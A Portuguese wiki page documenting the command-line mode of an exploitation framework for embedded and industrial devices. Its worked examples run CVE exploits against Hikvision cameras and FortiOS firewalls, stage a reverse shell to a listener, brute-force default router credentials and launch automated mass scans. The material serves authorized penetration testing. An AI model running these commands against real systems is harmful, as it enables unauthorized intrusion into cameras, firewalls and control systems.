# Modo Não Interativo

**Idioma:** Português (pt-BR). **English:** [../en-US/04-non-interactive-mode.md](../en-US/04-non-interactive-mode.md)

---

## Visão geral

O modo não interativo executa um módulo ou varredura a partir da linha de comando sem abrir o shell interativo. É projetado para **automação**, pipelines CI/CD, avaliações agendadas por cron e exploração de única execução na linha de comando.

> **Nota:** O modo não interativo `-m` sempre chama `run()` diretamente. Ele não chama `check()` primeiro. Para executar apenas `check()`, use o shell interativo.

Todos os três pontos de entrada são equivalentes:

```bash
embedxpl -m <caminho> -s "<opt> <val>"      # ponto de entrada pip (recomendado)
exf      -m <caminho> -s "<opt> <val>"      # alias
python -m embedxpl -m <caminho> -s "<opt> <val>"   # invocação de módulo
python exf.py      -m <caminho> -s "<opt> <val>"   # bootstrap legado
```

---

## Referência completa de flags

| Flag | Forma longa | Tipo | Obrigatório | Descrição |
|------|-------------|------|-------------|-----------|
| `-h` | `--help` | — | Não | Imprimir ajuda de uso e sair |
| `-m` | `--module` | string | Sim* | Caminho do módulo, ex.: `exploits/cameras/hikvision/rtsp_rce_cve_2021_36260` |
| `-s` | `--set` | string | Não | Definir uma opção do módulo; repita para cada opção (formato `"opcao valor"`) |
| `-T` | `--targets` | string (caminho de arquivo) | Não | Varredura multi-alvo a partir de arquivo; cada linha é um IP ou CIDR |
| `--infra` | — | string | Não | Tipo de infraestrutura: `wizard`, `ot`, `it`, `soho`, ou chave personalizada |
| `--context` | — | string | Não | Contexto operacional para modo infra (ex.: `ics`, `scada`, `dmz`) |
| `--target` | — | string | Não | Endereço IP ou faixa CIDR para o plano de varredura infra |

\* `-m` é obrigatório a menos que seja usado `-T`, `--infra wizard` ou `-h`.

---

## `-h` / `--help` — ajuda de uso

```bash
embedxpl -h
```

**Sessão de terminal:**

```text
$ embedxpl -h
[*] embedxpl -m <module> -s "<option> <value>"
       embedxpl -T <targets.txt>  (multi-target scan from file)
       embedxpl --infra ot --context ics --target 192.168.1.0/24
       embedxpl --infra wizard  (interactive infrastructure selection)
```

---

## `-m` / `--module` — executar um único módulo

```bash
embedxpl -m <caminho_modulo> [-s "<opcao> <valor>"] ...
```

**Sessão de terminal — exploit básico:**

```bash
$ embedxpl -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
    -s "target 192.168.1.100" \
    -s "port 80"
```

```text
[*] Running module <...rtsp_rce_cve_2021_36260.Exploit object>...
[*] Checking if 192.168.1.100:80 is a Hikvision device...
[*] Attempting CVE-2021-36260 RCE on 192.168.1.100...
[*] Response HTTP 400: <?xml version="1.0"...
[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
[!] Verify execution via OOB (e.g., Burp Collaborator or Interactsh).
```

**Erro — nenhum módulo especificado:**

```text
$ embedxpl
[-] A module is required when running non-interactively
```

**Erro — módulo desconhecido:**

```text
$ embedxpl -m exploits/cameras/hikvision/does_not_exist
[-] ImportError: No module named 'embedxpl.modules.exploits.cameras.hikvision.does_not_exist'
```

---

## `-s` / `--set` — definir opções do módulo

Cada flag `-s` aceita uma **única string entre aspas** contendo `"nome_opcao valor"`.

**Formato correto:**

```bash
# Uma opção por flag -s:
embedxpl -m exploits/cameras/dahua/cctv_rce_cve_2021_36260 \
    -s "target 192.168.1.50" \
    -s "port 80"
```

**Formato incorreto (não faça isso):**

```bash
# ERRADO — múltiplas opções em um único -s:
embedxpl -m ... -s "target 192.168.1.50 port 80"
```

**Valores com espaços — coloque aspas em todo o argumento `-s`:**

```bash
embedxpl -m exploits/printers/generic/pjl_info_disclosure \
    -s "target 10.0.0.50" \
    -s "cmd @PJL INFO ID"
```

---

## `-T` / `--targets` — varredura multi-alvo a partir de arquivo

```bash
embedxpl -T <arquivo_alvos>
```

**Parâmetros:**

| Parâmetro | Tipo | Obrigatório | Padrão | Valores aceitos | Descrição |
|-----------|------|-------------|--------|-----------------|-----------|
| `arquivo_alvos` | string (caminho de arquivo) | Sim | — | Caminho de arquivo legível | Caminho para arquivo com IPs/CIDRs, um por linha |

Formato do arquivo de alvos (uma entrada por linha; linhas em branco e comentários `#` são ignorados):

```text
# Segmento do datacenter
192.168.1.1
192.168.1.2
10.0.0.0/24
# Segmento SOHO
172.16.0.1
```

**Sessão de terminal:**

```text
$ embedxpl -T /tmp/targets.txt
[*] Multi-target scan from file: /tmp/targets.txt
[*] [192.168.1.1] [scanning] Starting ARP/ICMP sweep
[*] [192.168.1.1] [fingerprint] Probing 192.168.1.1...
[+] [192.168.1.1] done — 4 modules matched
[*] [192.168.1.2] [scanning] Starting ARP/ICMP sweep
[+] [192.168.1.2] done — 2 modules matched
[*] [10.0.0.0/24] [scanning] Scanning 254 hosts...
[+] [10.0.0.0/24] done — 6 total host(s) found

Scan complete — 3 target(s), 8 total host(s) found
  192.168.1.1 — 1 host(s):
    192.168.1.1: Huawei EG8145X6 [80,443] 78% — 4 modules
  192.168.1.2 — 1 host(s):
    192.168.1.2: ZTE H168N [80,23] 65% — 2 modules
  10.0.0.0/24 — 6 host(s):
    10.0.0.1: TP-Link Archer C6 [80,443] 82% — 5 modules
    ...
```

**Erro — arquivo não encontrado:**

```text
$ embedxpl -T /tmp/nonexistent.txt
[-] Targets file not found: /tmp/nonexistent.txt
```

**Paralelismo:** Até 4 faixas CIDR são varridas em paralelo (padrão `max_file_workers=4`). IPs individuais são processados sequencialmente dentro de cada worker.

---

## `--infra wizard` — wizard interativo de infraestrutura

```bash
embedxpl --infra wizard
```

Inicia um menu numerado interativo que solicita ao usuário a seleção do tipo de infraestrutura e contexto operacional. Ao final, imprime a lista de módulos resolvidos sem executá-los.

**Sessão de terminal:**

```text
$ embedxpl --infra wizard

Select infrastructure type:
  1. ot    (Operational Technology / ICS/SCADA)
  2. it    (Enterprise IT)
  3. soho  (Small Office / Home Office)
  4. iot   (IoT/Embedded Edge)
Choice: 1

Select context for 'ot':
  1. ics   (Industrial Control Systems)
  2. scada (SCADA/HMI)
  3. plc   (PLC-focused)
Choice: 1

[*] Scan plan ready: 18 modules for ot/ics
```

Cancelado com Ctrl+C:

```text
^C
[!] Wizard cancelled by user.
```

---

## `--infra` + `--context` + `--target` — plano de varredura de infraestrutura

```bash
embedxpl --infra <tipo> --context <contexto> --target <ip_ou_cidr>
```

**Parâmetros:**

| Flag | Tipo | Obrigatório | Descrição |
|------|------|-------------|-----------|
| `--infra` | string | Sim | Chave do tipo de infraestrutura (ex.: `ot`, `it`, `soho`) |
| `--context` | string | Não | Contexto operacional dentro do tipo infra (ex.: `ics`) |
| `--target` | string | Não | IP ou faixa CIDR |

**Sessão de terminal — plano de varredura OT/ICS:**

```text
$ embedxpl --infra ot --context ics --target 192.168.100.0/24

[*] OT/ICS scan plan for 192.168.100.0/24:
    18 modules selected

    Scan plan:
      scanners/ics/modbus_scanner
      scanners/ics/bacnet_scanner
      scanners/ics/s7_comm_scanner
      scanners/ics/enip_scanner
      scanners/ics/dnp3_scanner
      exploits/ics/...
      ...

[*] Use -m <module> -s "target 192.168.100.0/24" to run individual modules.
[*] Or launch interactive shell and type 'use <module>' to explore.
```

**Sessão de terminal — tipo infra desconhecido:**

```text
$ embedxpl --infra unknown_type --context ics
[-] Unknown infra type 'unknown_type'. Valid: ot, it, soho, iot
```

**Sessão de terminal — infra válida, sem contexto (lista contextos disponíveis):**

```text
$ embedxpl --infra ot
[*] Available contexts for --infra ot:
  ics
  scada
  plc
  historian
```

---

## Exemplos completos de uso

### Exploit de câmera (Hikvision CVE-2021-36260)

```bash
embedxpl \
    -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
    -s "target 192.168.1.100" \
    -s "port 80" \
    -s "command whoami"
```

```text
[*] Running module ...
[*] Checking 192.168.1.100:80...
[*] Attempting CVE-2021-36260 RCE...
[+] CVE-2021-36260: Payload delivered to 192.168.1.100:80. Monitor for callback.
```

### Teste de credenciais em roteador

```bash
embedxpl \
    -m creds/routers/dlink/telnet_default_creds \
    -s "target 192.168.1.1"
```

```text
[*] Running module ...
[*] Trying admin:admin on 192.168.1.1:23
[-] FAIL: admin:admin
[*] Trying admin:1234 on 192.168.1.1:23
[+] SUCCESS: admin:1234 — telnet shell obtained
```

### Auth bypass em firewall (FortiOS CVE-2022-40684)

```bash
embedxpl \
    -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
    -s "target 10.0.0.5"
```

```text
[*] Running module ...
[*] FortiOS at 10.0.0.5:443 -- auth bypass phase
[+] Bypass active with header variant
[*] Configuration dump...
[+] Admin Accounts: {"results": [{"name": "admin", "type": "administrator"}]}
```

### Auth bypass com staging de reverse shell

```bash
embedxpl \
    -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
    -s "target 10.0.0.5" \
    -s "lhost 10.0.0.99" \
    -s "lport 4444" \
    -s "shell_type python"
```

```text
[*] Running module ...
[*] FortiOS at 10.0.0.5:443 -- auth bypass active
[*] Phase 5 - Shell staging (type: python)...
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Shell connected from 10.0.0.5:52241 -- entering PTY interaction
[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.
$ id
uid=0(root) gid=0(root)
```

### Varredura completa AutoPwn em um único host

```bash
embedxpl \
    -m scanners/autopwn \
    -s "target 192.168.1.1" \
    -s "timing_template T4" \
    -s "vendor any"
```

```text
[*] AutoPwn timing profiles (Nmap-style -T0..-T5):
...
[*] AutoPwn timing template T4 (aggressive) active: threads=16
[*] 192.168.1.1 Starting vulnerability check...
[+] 192.168.1.1:80 http telnet_default_creds is vulnerable
[+] 192.168.1.1:80 http dir_300_600_rce is vulnerable
[-] 192.168.1.1:22 ssh ssh_default_creds is not vulnerable
...
[+] 192.168.1.1 Device is vulnerable:
┌───────────────┬──────┬──────────┬───────────────────────────────┐
│ Target        │ Port │ Service  │ Exploit                       │
├───────────────┼──────┼──────────┼───────────────────────────────┤
│ 192.168.1.1   │ 80   │ http     │ telnet_default_creds          │
│ 192.168.1.1   │ 80   │ http     │ dir_300_600_rce               │
└───────────────┴──────┴──────────┴───────────────────────────────┘
```

---

## Códigos de saída

| Código | Significado |
|--------|-------------|
| `0` | Módulo executado até a conclusão (NÃO implica que o alvo é vulnerável) |
| `1` | Erro: stdin não é TTY, módulo ausente, falha de importação ou erro de uso |

> **Importante:** Código de saída `0` significa que o módulo foi executado sem uma exceção Python fatal. Não significa que o alvo foi confirmado como vulnerável. Analise as linhas prefixadas com `[+]` no stdout para determinar o status de vulnerabilidade.

---

## Dicas de automação

1. **Analise linhas `[+]` para positivos:** `embedxpl -m ... 2>&1 | grep '^\[+\]'`
2. **Registre saída completa:** `embedxpl -m ... 2>&1 | tee /tmp/scan-$(date +%Y%m%d).log`
3. **Varreduras paralelas de múltiplos módulos:** invoque múltiplos processos, cada um com um `-m` diferente, contra um arquivo de alvos compartilhado.
4. **Use `-T` para varredura em lote de hosts:** crie um arquivo CIDR e deixe o EmbedXPL-Forge gerenciar o paralelismo com `max_file_workers=4`.
5. **Encadeie com jq para saída estruturada:** o comando `sessions export <ip>` emite JSON adequado para pós-processamento com jq.

---

[Hub da Wiki](../README.md)
